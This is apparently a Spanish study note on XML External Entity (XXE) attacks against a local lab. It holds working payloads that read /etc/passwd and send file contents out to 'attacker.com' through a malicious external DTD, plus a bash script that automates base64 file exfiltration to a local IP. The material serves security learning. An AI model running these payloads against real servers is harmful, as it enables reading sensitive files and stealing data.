> Un ataque de [Entidad Externa XML (XXE)](https://www.google.com/search?q=Entidad+Externa+XML+%28XXE%29&sca_esv=73000156de4ea350&sxsrf=ANbL-n71fyfCEezLEpdiTWDWkaAzuhi8Aw%3A1772572610983&ei=wk-nabDdO-Kf5OUP_fno8Qg&biw=1517&bih=724&oq=xxe&gs_lp=Egxnd3Mtd2l6LXNlcnAiA3h4ZSoCCAAyChAAGIAEGEMYigUyDRAuGIAEGNEDGMcBGAoyEBAAGIAEGLEDGIMBGIoFGAoyBhAAGAMYCjIMEC4YgAQYsQMYChgLMg8QLhiABBjRAxjHARgKGAsyEBAuGIAEGLEDGIMBGIoFGAoyCRAuGIAEGAoYCzIQEC4YgAQYsQMYgwEYigUYCjIMEAAYgAQYsQMYChgLSMoZULgGWJ4JcAF4AZABAJgBf6ABxAKqAQMxLjK4AQPIAQD4AQGYAgSgApgDqAIUwgIHECMYJxjqAsICBxAuGCcY6gLCAhAQABgDGLQCGOoCGI8B2AEBwgIQEC4YAxi0AhjqAhiPAdgBAcICChAjGIAEGCcYigXCAg0QLhiABBixAxhDGIoFwgIQEAAYgAQYsQMYQxiDARiKBcICChAuGIAEGEMYigXCAgsQLhiABBixAxiDAcICBRAAGIAEwgIcEC4YgAQYsQMYQxiKBRiXBRjcBBjeBBjgBNgBAZgDG_EFzFa5ZnIk5Ha6BgYIARABGAqSBwMxLjOgB5JJsgcDMC4zuAf8AsIHBTMtMi4yyAdHgAgA&sclient=gws-wiz-serp&mstk=AUtExfC8tHgwdpImtuF_5R2DYFEgTcRJeBx7_hwAhUXGD8BLgRLwE_JSCCAu_98GIIcE-qgqAJw9wVYMKpu9CX5f_CoErRVjj2dmakvUpA4vj67Bryz65EQQ9iVul3i5b0YfOJtv4IlX3hSdNC_fvELpgZIwz_0racAw40p4Jnp1qNehmWQ&csui=3&ved=2ahUKEwjk9J6H14STAxUDCLkGHbsTFBQQgK4QegQIARAB) explota analizadores XML mal configurados para leer archivos locales del servidor, realizar peticiones internas (SSRF), escanear puertos o lanzar ataques de denegación de servicio (DoS). Ocurre cuando una aplicación procesa entradas XML que incluyen referencias a entidades externas peligrosas, permitiendo al atacante acceder a datos sensibles del sistema.

## Que es XML?
> Un archivo **.xml** (_Extensible Markup Language_ o Lenguaje de Marcado Extensible) es un **formato de texto plano utilizado para estructurar, almacenar y transportar datos de manera jerárquica**, siendo legible tanto para humanos como para máquinas. A diferencia de HTML, utiliza etiquetas personalizadas (como `<producto>`) para definir el significado de la información, convirtiéndolo en un estándar para el intercambio de datos entre diferentes sistemas y aplicaciones.

### Estructura basica
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <elemento1 atributo="valor">
        <subelemento>Contenido</subelemento>
    </elemento1>
    <elemento2>Más contenido</elemento2>
</root>
```

### Entidades
- XML es mas flexible que HTML en el sentido de que se pueden crear entidades personalizadas
```
<!DOCTYPE foo [<!ENTITY myName "savitar">]>
&myName; # de esta forma hacemos referencia a la misma
```
- `&myName;` puede contener `SYSTEM 'file:///etc/passwd'` que es un comando que corre el servidor para mostrar el archivo `/etc/passwd`

## XXE OOB - Fuera de banda
> En el caso de los XXE fuera de banda (también llamados XXE ciegos), **no hay una respuesta inmediata de la aplicación web**. El proceso para explotar vulnerabilidades XXE fuera de banda es similar al uso de entidades de parámetros con XXE en banda e implica la creación de una **DTD (Definición de Tipo de Documento)** externa. Existe una diferencia importante: con este tipo de ataque, el atacante necesita que el analizador XML realice una solicitud adicional a un servidor controlado por el atacante. Esto es necesario para leer el contenido del archivo local.

- El pedido se realiza:
```xml
POST http://example.com/xml HTTP/1.1 
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE data [ <!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]> 
<data>&send;</data>
```
- Mientras el atacante tiene un archivo `attacker.com/evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>"> 
%all;
```
- El atacante puede poner a disposicion el archivo malicioso montando un servidor con python inclusive.

### Caso blind
- Hay veces que no puedes declarar entidades nuevas en el XML
`<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>`
- El `attacker.com` es claramente la ip de tu maquina, si usas docker podes probar `host.docker.internal`.
## Wrappers
- Existen diferentes wrapper que sirven para representar datos de diferentes formas:
`file://` - muestra la salida como esta originalmente
`php://filter/convert.base64-encode/resource=`

## Automatizacion
```bash
#!/bin/bash

echo; echo "Escribe la ruta del archivo a obtener: " && read -r myFile

echo """<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFile\">
<!ENTITY % eval '<!ENTITY &#x25; exfile SYSTEM \"http://192.168.100.19/?file=%file;\">'>
%eval;
%exfile;""" > hack.dtd

python3 -m http.server 80 &>response &

PID=$!
sleep 1

curl -s -X GET "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % myName SYSTEM "http://192.168.100.19/hack.dtd"> %myName; ]>
<root><name>cele</name><tel>123456789</tel><email>
cele@cele.com
</email><password>cele1234</password></root>' 1>/dev/null

kill -9 $PID
wait $PID 2>/dev/null

echo; cat response | grep -oP "file=\K[^.*\s]+" | base64 -d 
```
## Herramientas
- [[xxelab]]

